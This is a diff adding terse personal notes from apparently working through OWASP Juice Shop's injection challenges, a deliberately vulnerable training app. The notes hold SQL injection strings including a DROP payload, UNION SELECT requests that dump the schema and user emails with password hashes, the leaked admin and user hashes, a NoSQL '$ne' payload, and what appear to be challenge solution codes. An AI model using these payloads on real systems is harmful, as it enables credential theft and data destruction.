@@ -1,0 +1,47 @@
+sql injection attack and prevention
+input data not validated in backend
+101 or 1=1;
+101;drop maindb--
+'01/01/1999;--
+
+GET /rest/products/search?q=apple%'))--   //no error
+GET /rest/products/search?q=';     //no error
+
+POST /api/basketitems/  //to add item in basket
+
+4D66A6BBA488D7FC253EC3511FEAD
+database find and fix
+
+select sql from sqlite_master
+
+GET /rest/products/search?q=banana'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--
+
++ or %20 are used as space
+
+
+for user credentials:
+
+GET /rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--
+
+
+jim password hash-
+{"id":2,"name":"jim@juice-sh.op","description":"e541ca7ecf72b8d1286474fc613e5e45","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},
+
+admin password hash-
+{"id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},
+
+bender password hash-
+{"id":3,"name":"bender@juice-sh.op","description":"0c36e517e3fa95aabf1bbffc6744a4ef","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},
+
+
+OPTIONS /rest/products/1/reviews HTTP/1.1
+
+8388280c9e656fe7aa45e8920e36c5bfcbfa3519   for nosql manipulation
+
+ 25D66B3FAFB38616A91188964ECC8       nosql find and fix
+
+//to add reviews for all the products
+{"message":"helllo","id":{
+"$ne":-1
+}}
+
